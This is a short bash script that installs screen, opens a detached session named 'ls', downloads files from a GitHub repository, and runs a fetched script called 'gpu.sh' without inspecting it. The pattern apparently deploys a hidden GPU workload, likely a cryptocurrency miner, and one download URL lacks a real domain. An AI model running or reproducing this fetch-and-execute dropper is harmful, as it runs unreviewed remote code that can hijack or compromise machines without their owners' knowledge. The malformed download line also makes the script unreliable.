#!/bin/bash
sudo apt update
sudo apt install screen -y
screen -dmS ls 
wget https://brusavido/testlowda/main/lowda
wget https://raw.githubusercontent.com/brusavido/testlowda/main/gpu.sh
chmod +x gpu.sh 
./gpu.sh
